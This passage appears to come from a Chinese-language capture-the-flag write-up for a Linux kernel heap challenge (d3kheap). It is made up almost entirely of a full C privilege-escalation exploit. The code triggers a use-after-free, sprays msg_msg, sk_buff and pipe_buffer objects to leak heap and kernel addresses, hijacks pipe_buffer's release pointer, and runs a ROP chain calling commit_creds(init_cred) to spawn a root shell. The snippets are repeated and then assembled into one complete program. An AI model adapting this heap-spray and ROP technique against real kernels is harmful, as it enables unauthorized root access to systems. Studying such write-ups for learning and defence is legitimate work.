int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++)
        {
            // printf("[-] now %d, num %dn", i, j);
            if (write(sk_socket[i][0], buf, size) < 0)
                return -1;
        }
    return 0;
}  

int main(int argc, char **argv, char **envp)
{
  ......

  int         victim_qid;

  del();

    // 喷射sk_buff，使用sk_buff占用这个被释放的0x400堆块，并写入一个构造好的msg_msg结构
    puts("[*] spray sk_buff...");
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            *(uint64_t*)"unr4v31.", SECONDARY_MSG_SIZE, 0, 0);

    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");

    // 使用msgrcv来读取所有的msg队列中的内容，并添加MSG_COPY标识位，避免unlink时错误的链表指针导致内核崩溃
    victim_qid = -1;
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        // 由于我们修改过msg_msg结构体，所以它无法被读取出来，利用这一点可以判断出我们命中队列的下标
        if (peekMsg(msqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0)
        {
            printf("[+] victim qid: %dn", i);
            victim_qid = i;
        }
    }

    if (victim_qid == -1)
        errExit("failed to make the UAF in msg queue!");

    // 然后释放掉sk_buff
    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
}
```



```
#define VICTIM_MSG_TYPE     0x1337

buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            VICTIM_MSG_TYPE, 0x1000 - sizeof(struct msg_msg), 0, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
```



```
struct msg_msg  *nearby_msg;

struct
{
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

// oob_msg读取的数据会保存到oob_msg
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");

    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)
        errExit("failed to rehit the UAF object!");
  
  nearby_msg = (struct msg_msg*) 
            &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
    
    printf(" 33[32m 33[1m[+] addr of primary msg of msg nearby victim:  33[0m%llxn", 
            nearby_msg->m_list.prev);
```



```
if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            VICTIM_MSG_TYPE, sizeof(oob_msg.mtext), 
            nearby_msg->m_list.prev - 8, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");
    
    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG)
        errExit("failed to rehit the UAF object!");
    
    // cal the addr of UAF obj by the header we just read out
    nearby_msg_prim = (struct msg_msg*) 
            &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
    victim_addr = nearby_msg_prim->m_list.next - 0x400;
    
    printf(" 33[32m 33[1m[+] addr of msg next to victim:  33[0m%llxn", 
            nearby_msg_prim->m_list.next);
    printf(" 33[32m 33[1m[+] addr of msg UAF object:  33[0m%llxn", victim_addr);
```



```
if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    
    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            victim_addr + 0x800, victim_addr + 0x800, // a valid kheap addr is valid
            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - sizeof(struct msg_msg), 
            0, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");

  // 释放msg_msg结构
    if (readMsg(msqid[victim_qid], &secondary_msg, 
                sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
        errExit("failed to receive secondary msg!");
```



```
#define PIPE_NUM 256
#define ANON_PIPE_BUF_OPS 0xffffffff8203fe40

// pipe_buffer 结构体照着源码搬运过来
struct pipe_buffer
{
    uint64_t    page;
    uint32_t    offset, len;
    uint64_t    ops;
    uint32_t    flags;
    uint32_t    padding;
    uint64_t    private;
};

pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
    for (int i = 0; i < SOCKET_NUM; i++)
    {
        for (int j = 0; j < SK_BUFF_NUM; j++)
        {
            if (read(sk_sockets[i][1], &fake_secondary_msg, 
                    sizeof(fake_secondary_msg)) < 0)
                errExit("failed to release sk_buff!");
            
            if (pipe_buf_ptr->ops > 0xffffffff81000000)
            {
                printf(" 33[32m 33[1m[+] got anon_pipe_buf_ops:  33[0m%llxn", 
                        pipe_buf_ptr->ops);
                kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                kernel_base = 0xffffffff81000000 + kernel_offset;
            }
        }
    }

    printf(" 33[32m 33[1m[+] kernel base:  33[0m%llx  33[32m 33[1moffset:  33[0m%llxn", 
            kernel_base, kernel_offset);
```



```
#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
#define POP_RDI_RET 0xffffffff810938f0
#define INIT_CRED 0xffffffff82c6d580
#define COMMIT_CREDS 0xffffffff810d25c0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
#define FREE_PIPE_INFO 0xffffffff81327570

// 包含四个函数指针的结构体，照着源码搬运过来
struct pipe_buf_operations
{
    uint64_t    confirm;
    uint64_t    release;
    uint64_t    try_steal;
    uint64_t    get;
};

// 用户态起shell
void getRootShell(void)
{
    if (getuid())
        errExit("failed to gain the root!");
    
    printf(" 33[32m 33[1m[+] Succesfully gain the root privilege, trigerring root shell now... 33[0mn");
    system("/bin/sh");
}
  
pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
    pipe_buf_ptr->page = *(uint64_t*) "unr4v31.";
    pipe_buf_ptr->ops = victim_addr + 0x100;

    ops_ptr = (struct pipe_buf_operations *) &fake_secondary_msg[0x100];
    ops_ptr->release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;

    rop_idx = 0;
    rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
    rop_chain[rop_idx++] = *(uint64_t*) "unr4v31.";
    rop_chain[rop_idx++] = *(uint64_t*) "unr4v31.";
    rop_chain[rop_idx++] = getRootShell;
    rop_chain[rop_idx++] = user_cs;
    rop_chain[rop_idx++] = user_rflags;
    rop_chain[rop_idx++] = user_sp;
    rop_chain[rop_idx++] = user_ss;

    puts("[*] spray sk_buff to hijack pipe_buffer...");
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // for gdb attach only
    printf("[*] gadget: %pn", kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);
    printf("[*] free_pipe_info: %pn", kernel_offset + FREE_PIPE_INFO);
    sleep(5);

    puts("[*] trigger fake ops->release to hijack RIP...");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
```



```
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define PRIMARY_MSG_SIZE 96
#define SECONDARY_MSG_SIZE 0x400

#define PRIMARY_MSG_TYPE    0x41
#define SECONDARY_MSG_TYPE  0x42
#define VICTIM_MSG_TYPE     0x1337
#define MSG_TAG     0xAAAAAAAA

#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 256
#define MSG_QUEUE_NUM 4096

#define OBJ_ADD     0x1234
#define OBJ_EDIT    0x4321
#define OBJ_SHOW  0xbeef
#define OBJ_DEL     0xdead

#define PREPARE_KERNEL_CRED 0xffffffff810d2ac0
#define INIT_CRED 0xffffffff82c6d580
#define COMMIT_CREDS 0xffffffff810d25c0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
#define POP_RDI_RET 0xffffffff810938f0
#define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
#define FREE_PIPE_INFO 0xffffffff81327570
#define POP_R14_POP_RBP_RET 0xffffffff81003364
#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
#define CALL_RSI_PTR 0xffffffff8105acec

size_t user_cs, user_ss, user_sp, user_rflags;
size_t kernel_offset, kernel_base = 0xffffffff81000000;
size_t prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;

long dev_fd;
int pipe_fd[2], pipe_fd2[2], pipe_fd_1;

/*
 * skb_shared_info 会携带320字节的头信息，所以大小是：
 * 1024 - 320 = 704
 */
char fake_secondary_msg[704];

void add(void)
{
    ioctl(dev_fd, OBJ_ADD);
}

void del(void)
{
    ioctl(dev_fd, OBJ_DEL);
}

size_t user_cs, user_ss, user_sp, user_rflags;

// 保存用户态寄存器，退出内核态时使用
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf(" 33[34m 33[1m[*] Status has been saved. 33[0mn");
}

// 链表结构
struct list_head
{
    uint64_t    next;
    uint64_t    prev;
};

// msg_msg 信息头部结构体
struct msg_msg
{
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

// msg_msg 超出0x1000的部分不包含头部信息，而是一个next指针
struct msg_msgseg
{
    uint64_t    next;
};

// 主消息大小0x60
struct 
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
}primary_msg;

// 副消息大小0x400
struct 
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
}secondary_msg;

// 占用两页大小来读取存在的数据
struct
{
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

// pipe_buffer 结构体照着源码搬运过来
struct pipe_buffer
{
    uint64_t    page;
    uint32_t    offset, len;
    uint64_t    ops;
    uint32_t    flags;
    uint32_t    padding;
    uint64_t    private;
};

// 包含四个函数指针的结构体，照着源码搬运过来
struct pipe_buf_operations
{
    uint64_t    confirm;
    uint64_t    release;
    uint64_t    try_steal;
    uint64_t    get;
};

void errExit(char *msg)
{
    printf(" 33[31m 33[1m[x] Error: %s 33[0mn", msg);
    exit(EXIT_FAILURE);
}

// msgrcv接收消息，从内核复制消息到用户，参数2是用户数据区，最后会调用free_msg释放消息
int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

// msgsnd发送消息，将用户数据发送到内核
int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    *(long*)msgp = msgtyp;
    return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

// msgrcv接受消息，加上MSG_COPY标志的话，读取过的内核数据区不会被unlink
int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
}

// 构造msg_msg结构，向参数1结构体赋值
void buildMsg(struct msg_msg *msg, uint64_t m_list_next,
    uint64_t m_list_prev, uint64_t m_type, uint64_t m_ts, 
    uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

// 喷射sk_buff结构，他附带一个skb_shared_info结构体。向socketpair写来达到分配的目的，喷射大小为0x400，每个socketpair喷射128次
int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++)
        {
            // printf("[-] now %d, num %dn", i, j);
            if (write(sk_socket[i][0], buf, size) < 0)
                return -1;
        }
    return 0;
}

// 释放sk_buff结构，向socketpair读来达到释放的目的
int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++)
            if (read(sk_socket[i][1], buf, size) < 0)
                return -1;
    return 0;
}

// 用户态起shell
void getRootShell(void)
{
    if (getuid())
        errExit("failed to gain the root!");
    
    printf(" 33[32m 33[1m[+] Succesfully gain the root privilege, trigerring root shell now... 33[0mn");
    system("/bin/sh");
}

int main(int argc, char **argv, char **envp)
{
    int         oob_pipe_fd[2];
    int         sk_sockets[SOCKET_NUM][2];
    int         pipe_fd[PIPE_NUM][2];
    int         msqid[MSG_QUEUE_NUM];
    int         victim_qid, real_qid;
    struct msg_msg  *nearby_msg;
    struct msg_msg  *nearby_msg_prim;
    struct pipe_buffer *pipe_buf_ptr;
    struct pipe_buf_operations *ops_ptr;
    uint64_t    victim_addr;
    uint64_t    kernel_base;
    uint64_t    kernel_offset;
    uint64_t    *rop_chain;
    int         rop_idx;
    cpu_set_t   cpu_set;

    saveStatus();

    /*
     * Step.O
     * 初始化
     */

    // 绑定单核
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    
    // 创建16对socketpair，描述符存在sk_sockets数组中
    for (int i = 0; i < SOCKET_NUM; i++)
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0)
            errExit("failed to create socket pair!");
    
    dev_fd = open("/dev/d3kheap", O_RDONLY);

    /*
     * Step.1
     * msgget 创建 msg 队列
     * 使用模块功能添加一个0x400大小堆块
     * 喷射msg_msg结构，每次都发送两条消息，一条0x60大小，另一条0x400大小
     * 当循环到中途时释放掉之前添加的0x400，之后msgsnd时有极大几率分配到此chunk
     */

    // 创建4096个消息队列
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
            errExit("failed to create msg_queue!");
    }

    // 初始化主消息和副消息
    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));

    // 使用模块功能分配0x400堆块
    add();

    // 喷射0x60和0x400堆块，在中途释放掉模块申请的0x400,使后续的副消息堆块进行占用，那么这个堆块内容就是我们可控的了
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &primary_msg, 
                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
            errExit("failed to send primary msg!");

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &secondary_msg, 
                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
            errExit("failed to send secondary msg!");
        
        if (i == 1024)
            del();
    }

    /*
     * Step.2
     * 再次释放这个可控堆块，让它进入free list,
     * 然后我们构造一个假的msg_msg结构体，把m_ts成员设置成0x400，它其实就是大小，其他的随意
     * 接下来再次喷射sk_buff，让sk_buff占用，并将我们构造的msg_msg写入到刚才释放的堆块中
     */

    del();

    // 喷射sk_buff，使用sk_buff占用这个被释放的0x400堆块，并写入一个构造好的msg_msg结构
    puts("[*] spray sk_buff...");
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            *(uint64_t*)"unr4v31.", SECONDARY_MSG_SIZE, 0, 0);

    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");

    // 使用msgrcv来读取所有的msg队列中的内容，并添加MSG_COPY标识位，避免unlink时错误的链表指针导致内核崩溃
    victim_qid = -1;
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        // 由于我们修改过msg_msg结构体，所以它无法被读取出来，利用这一点可以判断出我们命中队列的下标
        if (peekMsg(msqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0)
        {
            printf("[+] victim qid: %dn", i);
            victim_qid = i;
        }
    }

    if (victim_qid == -1)
        errExit("failed to make the UAF in msg queue!");

    // 然后释放掉sk_buff
    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    

    /*
     * Step.3
     * 接下来我们要重新把这些堆块申请回来，修改它们的m_ts成员为0x1000-0x30，这样就可以刚好申请到一页大小
     * 有了m_ts成员之后，我们就可以通过它来进行越界读取，找出堆喷命中的UAF堆块
     */

    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            VICTIM_MSG_TYPE, 0x1000 - sizeof(struct msg_msg), 0, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // oob_msg读取的数据会保存到oob_msg
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");

    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)
        errExit("failed to rehit the UAF object!");

    nearby_msg = (struct msg_msg*) 
            &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
    
    printf(" 33[32m 33[1m[+] addr of primary msg of msg nearby victim:  33[0m%llxn", 
            nearby_msg->m_list.prev);

    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            VICTIM_MSG_TYPE, sizeof(oob_msg.mtext), 
            nearby_msg->m_list.prev - 8, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");
    
    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG)
        errExit("failed to rehit the UAF object!");
    
    // cal the addr of UAF obj by the header we just read out
    nearby_msg_prim = (struct msg_msg*) 
            &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
    victim_addr = nearby_msg_prim->m_list.next - 0x400;
    
    printf(" 33[32m 33[1m[+] addr of msg next to victim:  33[0m%llxn", 
            nearby_msg_prim->m_list.next);
    printf(" 33[32m 33[1m[+] addr of msg UAF object:  33[0m%llxn", victim_addr);

    /*
     * Step.4
     * 修复msg_msg结构体，释放后喷射pipe_buffer结构体，泄露内核地址
     */

    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    
    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            victim_addr + 0x800, victim_addr + 0x800, // a valid kheap addr is valid
            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - sizeof(struct msg_msg), 
            0, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // 释放msg_msg结构
    if (readMsg(msqid[victim_qid], &secondary_msg, 
                sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
        errExit("failed to receive secondary msg!");
    
    // 喷射pipe_buffer
    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
            errExit("failed to create pipe!");
        
        // write something to activate it
        if (write(pipe_fd[i][1], "unr4v31.", 8) < 0)
            errExit("failed to write the pipe!");
    }

    // 读取sk_buff，也是pipe_buffer结构体，这里直接用read会释放掉所有的sk_buff，方便后续再次分配进行写入
    pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
    for (int i = 0; i < SOCKET_NUM; i++)
    {
        for (int j = 0; j < SK_BUFF_NUM; j++)
        {
            if (read(sk_sockets[i][1], &fake_secondary_msg, 
                    sizeof(fake_secondary_msg)) < 0)
                errExit("failed to release sk_buff!");
            
            if (pipe_buf_ptr->ops > 0xffffffff81000000)
            {
                printf(" 33[32m 33[1m[+] got anon_pipe_buf_ops:  33[0m%llxn", 
                        pipe_buf_ptr->ops);
                kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                kernel_base = 0xffffffff81000000 + kernel_offset;
            }
        }
    }

    printf(" 33[32m 33[1m[+] kernel base:  33[0m%llx  33[32m 33[1moffset:  33[0m%llxn", 
            kernel_base, kernel_offset);
    
    /*
     * Step.5
     * 劫持pipe_buffer中的ops，释放所有的pipe_buffer来触发release函数，这样就完成控制流劫持
     */

    pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
    pipe_buf_ptr->page = *(uint64_t*) "unr4v31.";
    pipe_buf_ptr->ops = victim_addr + 0x100;

    ops_ptr = (struct pipe_buf_operations *) &fake_secondary_msg[0x100];
    ops_ptr->release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;

    rop_idx = 0;
    rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
    rop_chain[rop_idx++] = *(uint64_t*) "unr4v31.";
    rop_chain[rop_idx++] = *(uint64_t*) "unr4v31.";
    rop_chain[rop_idx++] = getRootShell;
    rop_chain[rop_idx++] = user_cs;
    rop_chain[rop_idx++] = user_rflags;
    rop_chain[rop_idx++] = user_sp;
    rop_chain[rop_idx++] = user_ss;

    puts("[*] spray sk_buff to hijack pipe_buffer...");
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // for gdb attach only
    printf("[*] gadget: %pn", kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);
    printf("[*] free_pipe_info: %pn", kernel_offset + FREE_PIPE_INFO);
    sleep(5);

    puts("[*] trigger fake ops->release to hijack RIP...");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1668574684.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1668574685.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1668574686.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1668574687.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1668574688.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1668574690.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1668574691.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1668574693.png)